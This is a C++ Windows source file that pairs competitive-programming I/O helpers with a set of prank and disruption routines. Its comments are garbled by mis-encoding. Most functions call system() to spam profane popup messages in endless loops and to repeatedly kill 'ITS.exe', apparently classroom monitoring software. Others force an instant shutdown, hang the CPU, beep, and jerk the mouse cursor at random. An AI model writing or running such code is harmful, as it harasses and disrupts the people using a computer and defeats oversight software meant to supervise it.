#include<bits/stdc++.h>
#include<windows.h>
using namespace std;
//һЩ���õĺ���

void read(int &x)
{
    char ch=getchar();
    x=0;
    while(ch<'0'||ch>'9')ch=getchar();
    while(ch>='0'&&ch<='9')
        {
            x=x*10+ch-48;
            ch=getchar();
        }
}
void print2(int x)
{
    if(x>9)print2(x/10);
    putchar(x%10+48); 
}
void print(int x)
{
    if(x<0)putchar('-'),x=-x;
    print2(x);
}
void printl(int x)
{
    if(x<0)putchar('-'),x=-x;
    print2(x);
    putchar('\n');
}
void read(long long &x)
{
    char ch=getchar();
    x=0;
    while(ch<'0'||ch>'9')ch=getchar();
    while(ch>='0'&&ch<='9')
        {
            x=x*10+ch-48;
            ch=getchar();
        }
}
void print2(long long x)
{
    if(x>9)print2(x/10);
    putchar(x%10+48); 
}
void print(long long x)
{
    if(x<0)putchar('-'),x=-x;
    print2(x);
}
//(x,y),[x,y]
int gcd(int x,int y)
{
    int t;
    while(x!=0)
        {
            t=x;
            x=y%x;
            y=t;
        }
    return y;
}
int lcm(int x,int y)
{
    return (long long)x*y/gcd(x,y);
}
bool readl(char *ch)
{
    char *c=ch;
    while((*ch=getchar())!=EOF&&*ch!='\n')ch++;
    *ch=0;
    if(strlen(c)==0)return 0;
    return 1;
}
//�ײ㺯��
//�����Ի���shit/fuck��
void SHIT()
{
    system("msg %username% SHIT");
}
void FUCK()
{
    system("msg %username% FUCK");
}
//ѧ��˼erר��
void ITS()
{
    system("taskkill /im ITS.exe");
}
void Shutdown()
{
    system("shutdown -a");
}
void jihe()
{
    system("taskkill /im ????.exe");
}
void close()
{
    system("shutdown -s -t 0");
}
//����������֣����BB_m()������ʮ��ϲ�������ʱ���ţ�
void B()
{
    putchar(7);
}
void ka()
{
    while(1);
}
//�������꣬���putmouse()
void put_mouse(int x,int y)
{
    SetCursorPos(rand()%x,rand()%y);
}
//ʵ�����˺���

void shit(int x)
{
    while(x--)SHIT();
}
void shit()
{
    while(1)SHIT();
}
void Shit(int x)
{
    while(x--)
        {
            SHIT();
            //��λ����
            Sleep(100);
        }
}
void Shit()
{
    while(1)
        {
            SHIT();
            Sleep(100);
        }
}
void fuck(int x)
{
    while(x--)FUCK();
}
void fuck()
{
    while(1)FUCK();
}
void Fuck(int x)
{
    while(x--)
        {
            FUCK();
            Sleep(100);
        }
}
void Fuck()
{
    while(1)
        {
            FUCK();
            Sleep(100);
        }
}
//�Զ��嵯��
void MSg(char ch[])
{
    const int l=strlen(ch)+16;
    char c[10005]="msg %username% ";
    for(int i=l;i>=15;i--)c[i]=ch[i-15];
    system(c);
}
void msg(char ch[],int x)
{
    const int l=strlen(ch)+16;
    char c[10005]="msg %username% ";
    for(int i=l;i>=15;i--)c[i]=ch[i-15];
    while(x--)system(c);
}
void msg(char ch[])
{
    const int l=strlen(ch)+16;
    char c[10005]="msg %username% ";
    for(int i=l;i>=15;i--)c[i]=ch[i-15];
    while(1)system(c);
}
void Msg(char ch[],int x)
{
    const int l=strlen(ch)+16;
    char c[10005]="msg %username% ";
    for(int i=l;i>=15;i--)c[i]=ch[i-15];
    while(x--)
        {
            system(c);
            Sleep(100);
        }
}
void Msg(char ch[])
{
    const int l=strlen(ch)+16;
    char c[10005]="msg %username% ";
    for(int i=l;i>=15;i--)c[i]=ch[i-15];
    while(1)
        {
            system(c);
            Sleep(100);
        }
}
void ITS(int x)
{
    while(x--)
        {
            ITS();
            Sleep(30000);
        }
}
void ITS(int x,int ms)
{
    while(x--)
        {
            ITS();
            Sleep(ms);
        }
}
void shutdown_a()
{
    while(1)Shutdown();
}
void shutdown_a(int x)
{
    while(x--)Shutdown();
}
void jihe(int x)
{
    while(1)
        {
            jihe();
            Sleep(15000);
        }
}
void BB_m(int x)
{
    while(x--)
        {
            B();
            Sleep(rand()%500+250);
        }
}
void BB_f(int x)
{
    while(x--)
        {
            B();
            Sleep(rand()%200+100);
        }
}
void BB_s(int x)
{
    while(x--)
        {
            B();
            Sleep(rand()%1000+800);
        }
}
//��������
void putmouse()
{
    int x=GetSystemMetrics(SM_CXSCREEN);
    int y=GetSystemMetrics(SM_CYSCREEN);
    srand(time(0));
    put_mouse(x,y);
}
void putmouse(int ms)
{
    int x=GetSystemMetrics(SM_CXSCREEN);
    int y=GetSystemMetrics(SM_CYSCREEN);
    int a=clock();
    srand(time(0));
    while(a+ms>clock())put_mouse(x,y);
}
